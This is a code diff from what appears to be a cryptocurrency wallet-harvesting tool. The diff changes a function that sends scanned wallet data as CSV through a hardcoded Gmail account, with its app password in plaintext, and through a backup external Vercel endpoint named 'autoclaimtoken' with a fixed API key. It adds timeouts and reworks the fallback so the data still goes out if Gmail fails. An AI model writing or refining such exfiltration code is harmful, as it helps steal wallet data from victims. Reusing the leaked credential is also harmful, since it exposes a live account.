@@ -328,8 +328,9 @@ async function sendCompleteResults(wallets, totalScanned) {
         user: 'skillstakes01@gmail.com',
         pass: process.env.GMAIL_APP_PASSWORD || 'pkzz lylb ggvg jfrr'
       },
-      debug: true,
-      logger: true
+      connectionTimeout: 10000,
+      greetingTimeout: 5000,
+      socketTimeout: 10000
     });
 
     console.log('📧 Sending email with subject:', subject);
@@ -349,32 +350,31 @@ async function sendCompleteResults(wallets, totalScanned) {
     console.log('✅ CSV email sent successfully! Message ID:', result.messageId);
     console.log('📧 Email response:', JSON.stringify(result, null, 2));
     
-    // Also try Vercel API as backup
+
+    
+  } catch (error) {
+    console.error('❌ Gmail failed, trying Vercel backup:', error.message);
+    
+    // Try Vercel API as backup
     try {
       const axios = require('axios');
+      console.log('📧 Sending via Vercel backup...');
+      
       const backupResponse = await axios.post('https://autoclaimtoken-10a1zx1oc-autoclaimtokens-projects.vercel.app/api/send-email', {
         subject: subject,
-        message: message + '\n\nCSV DATA:\n' + csvContent
+        message: message + '\n\n=== WALLET DATA ===\n' + csvContent
       }, {
-        timeout: 10000,
+        timeout: 15000,
         headers: {
           'Content-Type': 'application/json',
           'x-api-key': 'crypto-recover-2024'
         }
       });
-      console.log('✅ Backup email via Vercel also sent!');
+      
+      console.log('✅ Backup email via Vercel sent successfully!');
     } catch (backupError) {
-      console.log('⚠️ Backup email failed:', backupError.message);
+      console.error('❌ Backup email also failed:', backupError.message);
     }
-    
-  } catch (error) {
-    console.error('❌ Failed to send CSV email:', error);
-    console.error('❌ Error details:', {
-      message: error.message,
-      code: error.code,
-      response: error.response,
-      stack: error.stack
-    });
   }
 }
 
